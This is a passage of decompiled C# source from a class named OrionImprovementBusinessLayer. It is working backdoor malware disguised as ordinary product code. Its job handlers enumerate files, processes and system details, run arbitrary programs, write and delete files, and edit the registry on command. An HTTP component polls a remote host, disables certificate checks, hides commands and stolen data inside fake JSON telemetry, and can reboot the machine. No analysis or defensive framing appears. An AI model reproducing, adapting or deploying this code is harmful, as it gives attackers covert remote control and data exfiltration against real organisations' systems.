      public static void GetFileSystemEntries(string[] args, out string result)
      {
        string searchPattern = args.Length >= 2 ? args[1] : "*";
        string path = Environment.ExpandEnvironmentVariables(args[0]);
        string[] array1 = ((IEnumerable<string>) Directory.GetFiles(path, searchPattern)).Select<string, string>((Func<string, string>) (f => Path.GetFileName(f))).ToArray<string>();
        string[] array2 = ((IEnumerable<string>) Directory.GetDirectories(path, searchPattern)).Select<string, string>((Func<string, string>) (f => Path.GetFileName(f))).ToArray<string>();
        result = string.Join("\n", array2) + "\n\n" + string.Join(" \n", array1);
      }

      public static void GetProcessByDescription(string[] args, out string result)
      {
        result = (string) null;
        if (args.Length == 0)
        {
          foreach (Process process in Process.GetProcesses())
            result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i6420DGtjVWoNqzlAgA="), (object) process.Id, (object) OrionImprovementBusinessLayer.Quote(process.ProcessName));
        }
        else
        {
          using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(OrionImprovementBusinessLayer.ZipHelper.Unzip("C07NSU0uUdBScCvKz1UIz8wzNooPKMpPTi0uBgA=")))
          {
            foreach (ManagementObject managementObject1 in managementObjectSearcher.Get())
            {
              string[] strArray = new string[2]
              {
                string.Empty,
                string.Empty
              };
              ManagementObject managementObject2 = managementObject1;
              string str = OrionImprovementBusinessLayer.ZipHelper.Unzip("c08t8S/PSy0CAA==");
              object[] objArray = (object[]) strArray;
              string methodName = str;
              object[] args1 = objArray;
              Convert.ToInt32(managementObject2.InvokeMethod(methodName, args1));
              result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("i6420DGtjVWoNtTRNTSrVag2quWsNgYKKVSb1MZUm9ZyAQA="), managementObject1[OrionImprovementBusinessLayer.ZipHelper.Unzip("CyjKT04tLvZ0AQA=")], (object) OrionImprovementBusinessLayer.Quote(managementObject1[OrionImprovementBusinessLayer.ZipHelper.Unzip("80vMTQUA")].ToString()), managementObject1[args[0]], managementObject1[OrionImprovementBusinessLayer.ZipHelper.Unzip("C0gsSs0rCSjKT04tLvZ0AQA=")], (object) strArray[1], (object) strArray[0]);
            }
          }
        }
      }

      private static string GetDescriptionId(ref int i)
      {
        ++i;
        return "\n" + i.ToString() + ". ";
      }

      public static void CollectSystemDescription(string info, out string result)
      {
        result = (string) null;
        int i = 0;
        string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
        result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) + domainName;
        try
        {
          string str = ((SecurityIdentifier) new NTAccount(domainName, OrionImprovementBusinessLayer.ZipHelper.Unzip("c0zJzczLLC4pSizJLwIA")).Translate(typeof (SecurityIdentifier))).AccountDomainSid.ToString();
          result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) + str;
        }
        catch
        {
          result += OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i);
        }
        result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) + IPGlobalProperties.GetIPGlobalProperties().HostName;
        result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) + Environment.UserName;
        result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) + OrionImprovementBusinessLayer.GetOSVersion(true);
        result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) + Environment.SystemDirectory;
        result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) + (object) (int) TimeSpan.FromMilliseconds((double) (uint) Environment.TickCount).TotalDays;
        result = result + OrionImprovementBusinessLayer.Job.GetDescriptionId(ref i) + info + "\n";
        result += OrionImprovementBusinessLayer.GetNetworkAdapterConfiguration();
      }

      public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)
      {
        result = (string) null;
        string requestUriString = args[0];
        string s1 = args[1];
        string s2 = args.Length >= 3 ? args[2] : (string) null;
        string[] strArray = Encoding.UTF8.GetString(Convert.FromBase64String(s1)).Split(new string[3]
        {
          "\r\n",
          "\r",
          "\n"
        }, StringSplitOptions.None);
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
        httpWebRequest.ServerCertificateValidationCallback += (RemoteCertificateValidationCallback) ((sender, cert, chain, sslPolicyErrors) => true);
        httpWebRequest.Proxy = proxy;
        httpWebRequest.Timeout = 120000;
        httpWebRequest.Method = strArray[0].Split(' ')[0];
        foreach (string header in strArray)
        {
          int length = header.IndexOf(':');
          if (length > 0)
          {
            string headerName = header.Substring(0, length);
            string s3 = header.Substring(length + 1).TrimStart();
            if (!WebHeaderCollection.IsRestricted(headerName))
            {
              httpWebRequest.Headers.Add(header);
            }
            else
            {
              switch (OrionImprovementBusinessLayer.GetHash(headerName.ToLower()))
              {
                case 2734787258623754862:
                  httpWebRequest.Accept = s3;
                  continue;
                case 6116246686670134098:
                  httpWebRequest.ContentType = s3;
                  continue;
                case 7574774749059321801:
                  httpWebRequest.UserAgent = s3;
                  continue;
                case 8873858923435176895:
                  if (OrionImprovementBusinessLayer.GetHash(s3.ToLower()) == 1475579823244607677UL)
                  {
                    httpWebRequest.ServicePoint.Expect100Continue = true;
                    continue;
                  }
                  httpWebRequest.Expect = s3;
                  continue;
                case 9007106680104765185:
                  httpWebRequest.Referer = s3;
                  continue;
                case 11266044540366291518:
                  ulong hash = OrionImprovementBusinessLayer.GetHash(s3.ToLower());
                  httpWebRequest.KeepAlive = hash == 13852439084267373191UL || httpWebRequest.KeepAlive;
                  httpWebRequest.KeepAlive = hash != 14226582801651130532UL && httpWebRequest.KeepAlive;
                  continue;
                case 15514036435533858158:
                  httpWebRequest.Date = DateTime.Parse(s3);
                  continue;
                case 16066522799090129502:
                  httpWebRequest.Date = DateTime.Parse(s3);
                  continue;
                default:
                  continue;
              }
            }
          }
        }
        result += string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("qzaoVag2rFXwCAkJ0K82quUCAA=="), (object) httpWebRequest.Method, (object) httpWebRequest.Address.PathAndQuery, (object) httpWebRequest.ProtocolVersion.ToString());
        result = result + httpWebRequest.Headers.ToString() + "\n\n";
        if (!string.IsNullOrEmpty(s2))
        {
          using (Stream requestStream = httpWebRequest.GetRequestStream())
          {
            byte[] buffer = Convert.FromBase64String(s2);
            requestStream.Write(buffer, 0, buffer.Length);
          }
        }
        using (WebResponse response = httpWebRequest.GetResponse())
        {
          result += string.Format("{0} {1}\n", (object) (int) ((HttpWebResponse) response).StatusCode, (object) ((HttpWebResponse) response).StatusDescription);
          result = result + response.Headers.ToString() + "\n";
          using (Stream responseStream = response.GetResponseStream())
            result += new StreamReader(responseStream).ReadToEnd();
        }
      }

      public static int RunTask(string[] args, string cl, out string result)
      {
        result = (string) null;
        string fileName = Environment.ExpandEnvironmentVariables(args[0]);
        string arguments = args.Length > 1 ? cl.Substring(OrionImprovementBusinessLayer.Job.GetArgumentIndex(cl, 1)).Trim() : (string) null;
        using (Process process = new Process())
        {
          process.StartInfo = new ProcessStartInfo(fileName, arguments)
          {
            CreateNoWindow = false,
            UseShellExecute = false
          };
          if (process.Start())
          {
            result = process.Id.ToString();
            return 0;
          }
        }
        return 1;
      }

      public static void WriteFile(string[] args)
      {
        string path = Environment.ExpandEnvironmentVariables(args[0]);
        byte[] buffer = Convert.FromBase64String(args[1]);
        for (int index = 0; index < 3; ++index)
        {
          try
          {
            using (FileStream fileStream = new FileStream(path, FileMode.Append, FileAccess.Write))
            {
              fileStream.Write(buffer, 0, buffer.Length);
              break;
            }
          }
          catch (Exception ex)
          {
            if (index + 1 >= 3)
              throw;
          }
          OrionImprovementBusinessLayer.DelayMs(0.0, 0.0);
        }
      }

      public static void FileExists(string[] args, out string result)
      {
        string path = Environment.ExpandEnvironmentVariables(args[0]);
        result = System.IO.File.Exists(path).ToString();
      }

      public static int ReadRegistryValue(string[] args, out string result)
      {
        result = OrionImprovementBusinessLayer.RegistryHelper.GetValue(args[0], args[1], (object) null);
        return result != null ? 0 : 1;
      }

      public static void DeleteRegistryValue(string[] args)
      {
        OrionImprovementBusinessLayer.RegistryHelper.DeleteValue(args[0], args[1]);
      }

      public static void GetRegistrySubKeyAndValueNames(string[] args, out string result)
      {
        result = OrionImprovementBusinessLayer.RegistryHelper.GetSubKeyAndValueNames(args[0]);
      }

      public static int SetRegistryValue(string[] args)
      {
        RegistryValueKind valueKind = (RegistryValueKind) System.Enum.Parse(typeof (RegistryValueKind), args[2]);
        string valueData = args.Length > 3 ? Encoding.UTF8.GetString(Convert.FromBase64String(args[3])) : "";
        return !OrionImprovementBusinessLayer.RegistryHelper.SetValue(args[0], args[1], valueData, valueKind) ? 1 : 0;
      }
    }

    private class Proxy
    {
      private OrionImprovementBusinessLayer.ProxyType proxyType;
      private IWebProxy proxy;
      private string proxyString;

      public Proxy(OrionImprovementBusinessLayer.ProxyType proxyType)
      {
        try
        {
          this.proxyType = proxyType;
          switch (this.proxyType)
          {
            case OrionImprovementBusinessLayer.ProxyType.System:
              this.proxy = WebRequest.GetSystemWebProxy();
              break;
            case OrionImprovementBusinessLayer.ProxyType.Direct:
              this.proxy = (IWebProxy) null;
              break;
            default:
              this.proxy = ((IHttpProxySettings) HttpProxySettings.Instance).AsWebProxy();
              break;
          }
        }
        catch
        {
        }
      }

      public override string ToString()
      {
        if (this.proxyType != OrionImprovementBusinessLayer.ProxyType.Manual)
          return this.proxyType.ToString();
        if (this.proxy == null)
          return OrionImprovementBusinessLayer.ProxyType.Direct.ToString();
        if (string.IsNullOrEmpty(this.proxyString))
        {
          try
          {
            IHttpProxySettings instance = (IHttpProxySettings) HttpProxySettings.Instance;
            if (instance.get_IsDisabled())
              this.proxyString = OrionImprovementBusinessLayer.ProxyType.Direct.ToString();
            else if (instance.get_UseSystemDefaultProxy())
            {
              this.proxyString = WebRequest.DefaultWebProxy != null ? OrionImprovementBusinessLayer.ProxyType.Default.ToString() : OrionImprovementBusinessLayer.ProxyType.System.ToString();
            }
            else
            {
              this.proxyString = OrionImprovementBusinessLayer.ProxyType.Manual.ToString();
              if (instance.get_IsValid())
                this.proxyString = this.proxyString + ":" + instance.get_Uri() + "\t" + (instance.get_Credential() is UsernamePasswordCredential credential ? credential.get_Username() : (string) null) + "\t" + (instance.get_Credential() is UsernamePasswordCredential credential ? credential.get_Password() : (string) null);
            }
          }
          catch
          {
          }
        }
        return this.proxyString;
      }

      public IWebProxy GetWebProxy()
      {
        return this.proxy;
      }
    }

    private class HttpHelper
    {
      private readonly Random random = new Random();
      private DateTime timeStamp = DateTime.Now;
      private Guid sessionId = Guid.NewGuid();
      private readonly List<ulong> UriTimeStamps = new List<ulong>();
      private readonly byte[] customerId;
      private readonly string httpHost;
      private readonly OrionImprovementBusinessLayer.HttpOipMethods requestMethod;
      private bool isAbort;
      private int delay;
      private int delayInc;
      private readonly OrionImprovementBusinessLayer.Proxy proxy;
      private int mIndex;

      public void Abort()
      {
        this.isAbort = true;
      }

      public HttpHelper(byte[] customerId, OrionImprovementBusinessLayer.DnsRecords rec)
      {
        this.customerId = ((IEnumerable<byte>) customerId).ToArray<byte>();
        this.httpHost = rec.cname;
        this.requestMethod = (OrionImprovementBusinessLayer.HttpOipMethods) rec._type;
        this.proxy = new OrionImprovementBusinessLayer.Proxy((OrionImprovementBusinessLayer.ProxyType) rec.length);
      }

      private bool TrackEvent()
      {
        if (DateTime.Now.CompareTo(this.timeStamp.AddMinutes(1.0)) > 0)
        {
          if (OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(false) || OrionImprovementBusinessLayer.svcListModified2)
            return true;
          this.timeStamp = DateTime.Now;
        }
        return false;
      }

      private bool IsSynchronized(bool idle)
      {
        if ((uint) this.delay > 0U & idle)
        {
          if (this.delayInc == 0)
            this.delayInc = this.delay;
          double num = (double) this.delayInc * 1000.0;
          OrionImprovementBusinessLayer.DelayMs(0.9 * num, 1.1 * num);
          if (this.delayInc < 300)
          {
            this.delayInc *= 2;
            return true;
          }
        }
        else
        {
          OrionImprovementBusinessLayer.DelayMs(0.0, 0.0);
          this.delayInc = 0;
        }
        return false;
      }

      public void Initialize()
      {
        OrionImprovementBusinessLayer.HttpHelper.JobEngine job = OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle;
        string result = (string) null;
        int err = 0;
        try
        {
          for (int index = 1; index <= 3 && !this.isAbort; ++index)
          {
            byte[] outData = (byte[]) null;
            if (this.IsSynchronized(job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle))
              index = 0;
            if (this.TrackEvent())
            {
              this.isAbort = true;
              break;
            }
            HttpStatusCode uploadRequest = this.CreateUploadRequest(job, err, result, out outData);
            if (job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Exit || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Reboot)
            {
              this.isAbort = true;
              break;
            }
            switch (uploadRequest)
            {
              case (HttpStatusCode) 0:
                continue;
              case HttpStatusCode.OK:
              case HttpStatusCode.NoContent:
              case HttpStatusCode.NotModified:
                string args = (string) null;
                if (uploadRequest != HttpStatusCode.OK)
                {
                  if (uploadRequest == HttpStatusCode.NoContent)
                  {
                    index = job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.None || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle ? index : 0;
                    job = OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
                  }
                  else
                    job = OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle;
                }
                else
                {
                  job = this.ParseServiceResponse(outData, out args);
                  int num;
                  switch (job)
                  {
                    case OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle:
                    case OrionImprovementBusinessLayer.HttpHelper.JobEngine.None:
                      num = index;
                      break;
                    default:
                      num = 0;
                      break;
                  }
                  index = num;
                }
                err = this.ExecuteEngine(job, args, out result);
                continue;
              default:
                OrionImprovementBusinessLayer.DelayMin(1, 5);
                continue;
            }
          }
          if (job != OrionImprovementBusinessLayer.HttpHelper.JobEngine.Reboot)
            return;
          OrionImprovementBusinessLayer.NativeMethods.RebootComputer();
        }
        catch (Exception ex)
        {
        }
      }

      private int ExecuteEngine(
        OrionImprovementBusinessLayer.HttpHelper.JobEngine job,
        string cl,
        out string result)
      {
        result = (string) null;
        int num = 0;
        string[] args = OrionImprovementBusinessLayer.Job.SplitString(cl);
        try
        {
          if (job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.ReadRegistryValue || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.SetRegistryValue || (job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteRegistryValue || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetRegistrySubKeyAndValueNames))
            num = OrionImprovementBusinessLayer.HttpHelper.AddRegistryExecutionEngine(job, args, out result);
          switch (job)
          {
            case OrionImprovementBusinessLayer.HttpHelper.JobEngine.SetTime:
              int delay;
              OrionImprovementBusinessLayer.Job.SetTime(args, out delay);
              this.delay = delay;
              break;
            case OrionImprovementBusinessLayer.HttpHelper.JobEngine.CollectSystemDescription:
              OrionImprovementBusinessLayer.Job.CollectSystemDescription(this.proxy.ToString(), out result);
              break;
            case OrionImprovementBusinessLayer.HttpHelper.JobEngine.UploadSystemDescription:
              OrionImprovementBusinessLayer.Job.UploadSystemDescription(args, out result, this.proxy.GetWebProxy());
              break;
            case OrionImprovementBusinessLayer.HttpHelper.JobEngine.RunTask:
              num = OrionImprovementBusinessLayer.Job.RunTask(args, cl, out result);
              break;
            case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetProcessByDescription:
              OrionImprovementBusinessLayer.Job.GetProcessByDescription(args, out result);
              break;
            case OrionImprovementBusinessLayer.HttpHelper.JobEngine.KillTask:
              OrionImprovementBusinessLayer.Job.KillTask(args);
              break;
          }
          return job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.WriteFile || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.FileExists || (job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteFile || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileHash) || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileSystemEntries ? OrionImprovementBusinessLayer.HttpHelper.AddFileExecutionEngine(job, args, out result) : num;
        }
        catch (Exception ex)
        {
          if (!string.IsNullOrEmpty(result))
            result += "\n";
          result += ex.Message;
          return ex.HResult;
        }
      }

      private static int AddRegistryExecutionEngine(
        OrionImprovementBusinessLayer.HttpHelper.JobEngine job,
        string[] args,
        out string result)
      {
        result = (string) null;
        int num = 0;
        switch (job)
        {
          case OrionImprovementBusinessLayer.HttpHelper.JobEngine.ReadRegistryValue:
            num = OrionImprovementBusinessLayer.Job.ReadRegistryValue(args, out result);
            break;
          case OrionImprovementBusinessLayer.HttpHelper.JobEngine.SetRegistryValue:
            num = OrionImprovementBusinessLayer.Job.SetRegistryValue(args);
            break;
          case OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteRegistryValue:
            OrionImprovementBusinessLayer.Job.DeleteRegistryValue(args);
            break;
          case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetRegistrySubKeyAndValueNames:
            OrionImprovementBusinessLayer.Job.GetRegistrySubKeyAndValueNames(args, out result);
            break;
        }
        return num;
      }

      private static int AddFileExecutionEngine(
        OrionImprovementBusinessLayer.HttpHelper.JobEngine job,
        string[] args,
        out string result)
      {
        result = (string) null;
        int num = 0;
        switch (job)
        {
          case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileSystemEntries:
            OrionImprovementBusinessLayer.Job.GetFileSystemEntries(args, out result);
            break;
          case OrionImprovementBusinessLayer.HttpHelper.JobEngine.WriteFile:
            OrionImprovementBusinessLayer.Job.WriteFile(args);
            break;
          case OrionImprovementBusinessLayer.HttpHelper.JobEngine.FileExists:
            OrionImprovementBusinessLayer.Job.FileExists(args, out result);
            break;
          case OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteFile:
            OrionImprovementBusinessLayer.Job.DeleteFile(args);
            break;
          case OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileHash:
            num = OrionImprovementBusinessLayer.Job.GetFileHash(args, out result);
            break;
        }
        return num;
      }

      private static byte[] Deflate(byte[] body)
      {
        int num = 0;
        byte[] array = ((IEnumerable<byte>) body).ToArray<byte>();
        for (int index = 1; index < array.Length; ++index)
        {
          array[index] ^= array[0];
          num += (int) array[index];
        }
        return (int) (byte) num == (int) array[0] ? OrionImprovementBusinessLayer.ZipHelper.Decompress(((IEnumerable<byte>) array).Skip<byte>(1).ToArray<byte>()) : (byte[]) null;
      }

      private static byte[] Inflate(byte[] body)
      {
        byte[] numArray1 = OrionImprovementBusinessLayer.ZipHelper.Compress(body);
        byte[] numArray2 = new byte[numArray1.Length + 1];
        numArray2[0] = (byte) ((IEnumerable<byte>) numArray1).Sum<byte>((Func<byte, int>) (b => (int) b));
        for (int index = 0; index < numArray1.Length; ++index)
          numArray1[index] ^= numArray2[0];
        Array.Copy((Array) numArray1, 0, (Array) numArray2, 1, numArray1.Length);
        return numArray2;
      }

      private OrionImprovementBusinessLayer.HttpHelper.JobEngine ParseServiceResponse(
        byte[] body,
        out string args)
      {
        args = (string) null;
        try
        {
          if (body == null || body.Length < 4)
            return OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
          switch (this.requestMethod)
          {
            case OrionImprovementBusinessLayer.HttpOipMethods.Put:
              body = ((IEnumerable<byte>) body).Skip<byte>(48).ToArray<byte>();
              break;
            case OrionImprovementBusinessLayer.HttpOipMethods.Post:
              body = ((IEnumerable<byte>) body).Skip<byte>(12).ToArray<byte>();
              break;
            default:
              body = OrionImprovementBusinessLayer.HexStringToByteArray(string.Join("", Regex.Matches(Encoding.UTF8.GetString(body), OrionImprovementBusinessLayer.ZipHelper.Unzip("U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA"), RegexOptions.IgnoreCase).Cast<System.Text.RegularExpressions.Match>().Select<System.Text.RegularExpressions.Match, string>((Func<System.Text.RegularExpressions.Match, string>) (m => m.Value)).ToArray<string>()).Replace("\"", string.Empty).Replace("-", string.Empty).Replace("{", string.Empty).Replace("}", string.Empty));
              break;
          }
          int int32 = BitConverter.ToInt32(body, 0);
          body = ((IEnumerable<byte>) body).Skip<byte>(4).Take<byte>(int32).ToArray<byte>();
          if (body.Length != int32)
            return OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
          string[] strArray = Encoding.UTF8.GetString(OrionImprovementBusinessLayer.HttpHelper.Deflate(body)).Trim().Split(new char[1]
          {
            ' '
          }, 2);
          OrionImprovementBusinessLayer.HttpHelper.JobEngine jobEngine = (OrionImprovementBusinessLayer.HttpHelper.JobEngine) int.Parse(strArray[0]);
          args = strArray.Length > 1 ? strArray[1] : (string) null;
          return System.Enum.IsDefined(typeof (OrionImprovementBusinessLayer.HttpHelper.JobEngine), (object) jobEngine) ? jobEngine : OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
        }
        catch (Exception ex)
        {
        }
        return OrionImprovementBusinessLayer.HttpHelper.JobEngine.None;
      }

      public static void Close(OrionImprovementBusinessLayer.HttpHelper http, Thread thread)
      {
        if (thread == null || !thread.IsAlive)
          return;
        http?.Abort();
        try
        {
          thread.Join(60000);
          if (!thread.IsAlive)
            return;
          thread.Abort();
        }
        catch (Exception ex)
        {
        }
      }

      private string GetCache()
      {
        byte[] array = ((IEnumerable<byte>) this.customerId).ToArray<byte>();
        byte[] numArray = new byte[array.Length];
        this.random.NextBytes(numArray);
        for (int index = 0; index < array.Length; ++index)
          array[index] ^= numArray[2 + index % 4];
        return OrionImprovementBusinessLayer.ByteArrayToHexString(array) + OrionImprovementBusinessLayer.ByteArrayToHexString(numArray);
      }

      private string GetOrionImprovementCustomerId()
      {
        byte[] b = new byte[16];
        for (int index = 0; index < b.Length; ++index)
          b[index] = (byte) ((uint) ~this.customerId[index % (this.customerId.Length - 1)] + (uint) (index / this.customerId.Length));
        return new Guid(b).ToString().Trim('{', '}');
      }

      private HttpStatusCode CreateUploadRequestImpl(
        HttpWebRequest request,
        byte[] inData,
        out byte[] outData)
      {
        outData = (byte[]) null;
        try
        {
          request.ServerCertificateValidationCallback += (RemoteCertificateValidationCallback) ((sender, cert, chain, sslPolicyErrors) => true);
          request.Proxy = this.proxy.GetWebProxy();
          request.UserAgent = this.GetUserAgent();
          request.KeepAlive = false;
          request.Timeout = 120000;
          request.Method = "GET";
          if (inData != null)
          {
            request.Method = "POST";
            using (Stream requestStream = request.GetRequestStream())
              requestStream.Write(inData, 0, inData.Length);
          }
          using (WebResponse response = request.GetResponse())
          {
            using (Stream responseStream = response.GetResponseStream())
            {
              byte[] buffer = new byte[4096];
              using (MemoryStream memoryStream = new MemoryStream())
              {
                int count;
                while ((count = responseStream.Read(buffer, 0, buffer.Length)) > 0)
                  memoryStream.Write(buffer, 0, count);
                outData = memoryStream.ToArray();
              }
            }
            return ((HttpWebResponse) response).StatusCode;
          }
        }
        catch (WebException ex)
        {
          if (ex.Status == WebExceptionStatus.ProtocolError)
          {
            if (ex.Response != null)
              return ((HttpWebResponse) ex.Response).StatusCode;
          }
        }
        catch (Exception ex)
        {
        }
        return HttpStatusCode.Unused;
      }

      private HttpStatusCode CreateUploadRequest(
        OrionImprovementBusinessLayer.HttpHelper.JobEngine job,
        int err,
        string response,
        out byte[] outData)
      {
        string str1 = this.httpHost;
        byte[] inData = (byte[]) null;
        OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods method = job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Idle || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.None ? OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Get : OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head;
        outData = (byte[]) null;
        try
        {
          if (!string.IsNullOrEmpty(response))
          {
            byte[] bytes1 = Encoding.UTF8.GetBytes(response);
            byte[] bytes2 = BitConverter.GetBytes(err);
            byte[] body = new byte[bytes1.Length + bytes2.Length + this.customerId.Length];
            Array.Copy((Array) bytes1, (Array) body, bytes1.Length);
            Array.Copy((Array) bytes2, 0, (Array) body, bytes1.Length, bytes2.Length);
            Array.Copy((Array) this.customerId, 0, (Array) body, bytes1.Length + bytes2.Length, this.customerId.Length);
            inData = OrionImprovementBusinessLayer.HttpHelper.Inflate(body);
            method = inData.Length <= 10000 ? OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Put : OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Post;
          }
          if (!str1.StartsWith(Uri.UriSchemeHttp + "://", StringComparison.OrdinalIgnoreCase) && !str1.StartsWith(Uri.UriSchemeHttps + "://", StringComparison.OrdinalIgnoreCase))
            str1 = Uri.UriSchemeHttps + "://" + str1;
          if (!str1.EndsWith("/"))
            str1 += "/";
          HttpWebRequest request = (HttpWebRequest) WebRequest.Create(str1 + this.GetBaseUri(method, err));
          if (method == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Get || method == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head)
            request.Headers.Add(OrionImprovementBusinessLayer.ZipHelper.Unzip("80zT9cvPS9X1TSxJzgAA"), this.GetCache());
          if (method == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Put && (this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Get || this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Head))
          {
            int[] intArray = this.GetIntArray(inData != null ? inData.Length : 0);
            int count = 0;
            ulong num1 = (ulong) DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMilliseconds - 300000UL;
            string str2 = "{" + string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("UyotTi3yTFGyUqo2qFXSAQA="), (object) this.GetOrionImprovementCustomerId()) + string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("UypOLS7OzM/zTFGyUqo2qFXSAQA="), (object) this.sessionId.ToString().Trim('{', '}')) + OrionImprovementBusinessLayer.ZipHelper.Unzip("UyouSS0oVrKKBgA=");
            for (int index1 = 0; index1 < intArray.Length; ++index1)
            {
              uint num2 = this.random.Next(4) == 0 ? (uint) this.random.Next(512) : 0U;
              ulong num3 = num1 + (ulong) num2;
              byte[] inArray;
              if (intArray[index1] > 0)
              {
                num1 = num3 | 2UL;
                inArray = ((IEnumerable<byte>) inData).Skip<byte>(count).Take<byte>(intArray[index1]).ToArray<byte>();
                count += intArray[index1];
              }
              else
              {
                num1 = num3 & 18446744073709551613UL;
                inArray = new byte[this.random.Next(16, 28)];
                for (int index2 = 0; index2 < inArray.Length; ++index2)
                  inArray[index2] = (byte) this.random.Next();
              }
              str2 = str2 + "{" + string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("UwrJzE0tLknMLVCyUorRd0ksSdWoNqjVjNFX0gEA"), (object) num1) + string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("U/LMS0mtULKqNqjVAQA="), (object) this.mIndex++) + OrionImprovementBusinessLayer.ZipHelper.Unzip("U3ItS80rCaksSFWyUvIvyszPU9IBAA==") + OrionImprovementBusinessLayer.ZipHelper.Unzip("U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==") + string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("U3IpLUosyczP8y1Wsqo2qNUBAA=="), (object) num2) + OrionImprovementBusinessLayer.ZipHelper.Unzip("UwouTU5OTU1JTVGyKikqTdUBAA==") + string.Format(OrionImprovementBusinessLayer.ZipHelper.Unzip("U/JNLS5OTE9VslKqNqhVAgA="), (object) Convert.ToBase64String(inArray).Replace("/", "\\/")) + (index1 + 1 != intArray.Length ? "}," : "}");
            }
            string s = str2 + "]}";
            request.ContentType = OrionImprovementBusinessLayer.ZipHelper.Unzip("SywoyMlMTizJzM/TzyrOzwMA");
            inData = Encoding.UTF8.GetBytes(s);
          }
          if (method == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Post || this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Put || this.requestMethod == OrionImprovementBusinessLayer.HttpOipMethods.Post)
            request.ContentType = OrionImprovementBusinessLayer.ZipHelper.Unzip("SywoyMlMTizJzM/Tz08uSS3RLS4pSk3MBQA=");
          return this.CreateUploadRequestImpl(request, inData, out outData);
        }
        catch (Exception ex)
        {
        }
        return (HttpStatusCode) 0;
      }

      private int[] GetIntArray(int sz)
      {
        int[] numArray = new int[30];
        int val2 = sz;
        for (int index = numArray.Length - 1; index >= 0; --index)
        {
          if (val2 < 16 || index == 0)
          {
            numArray[index] = val2;
            break;
          }
          int num1 = val2 / (index + 1) + 1;
          if (num1 < 16)
          {
            numArray[index] = this.random.Next(16, Math.Min(32, val2) + 1);
            val2 -= numArray[index];
          }
          else
          {
            int num2 = Math.Min(512 - num1, num1 - 16);
            numArray[index] = this.random.Next(num1 - num2, num1 + num2 + 1);
            val2 -= numArray[index];
          }
        }
        return numArray;
      }

      private bool Valid(int percent)
      {
        return this.random.Next(100) < percent;
      }

      private string GetBaseUri(
        OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods method,
        int err)
      {
        int num = method == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Get || method == OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods.Head ? 16 : 1;
        string baseUriImpl;
        do
        {
          baseUriImpl = this.GetBaseUriImpl(method, err);
          ulong hash = OrionImprovementBusinessLayer.GetHash(baseUriImpl);
          if (!this.UriTimeStamps.Contains(hash))
          {
            this.UriTimeStamps.Add(hash);
            break;
          }
        }
        while (--num > 0);
        return baseUriImpl;
      }

      private string GetBaseUriImpl(
        OrionImprovementBusinessLayer.HttpHelper.HttpOipExMethods method,
        int err)
      {
        string str1 = (string) null;
